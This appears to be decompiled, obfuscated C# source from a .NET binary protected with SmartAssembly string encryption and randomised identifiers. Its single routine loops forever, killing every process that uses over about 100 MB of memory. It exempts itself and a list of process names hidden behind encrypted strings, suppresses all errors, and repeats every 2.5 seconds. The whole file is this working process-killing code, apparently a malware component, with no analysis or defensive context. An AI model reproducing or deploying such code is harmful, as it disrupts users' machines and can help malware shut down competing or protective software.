using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace HuHbCLeSgdQqCa;

public static class mOkpVxsIHuQ
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void jFqZkVnQJdf()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 100000000L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107409927)) && !process.ProcessName.Contains(getString_0(107409918)) && !process.ProcessName.Contains(getString_0(107409877)) && !process.ProcessName.Contains(getString_0(107409868)) && !process.ProcessName.Contains(getString_0(107409887)) && !process.ProcessName.Contains(getString_0(107409842)) && !process.ProcessName.Contains(getString_0(107409861)) && !process.ProcessName.Contains(getString_0(107409816)) && !process.ProcessName.Contains(getString_0(107409803)) && !process.ProcessName.Contains(getString_0(107409822)) && !process.ProcessName.Contains(getString_0(107409289)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static mOkpVxsIHuQ()
	{
		Strings.CreateGetStringDelegate(typeof(mOkpVxsIHuQ));
	}
}
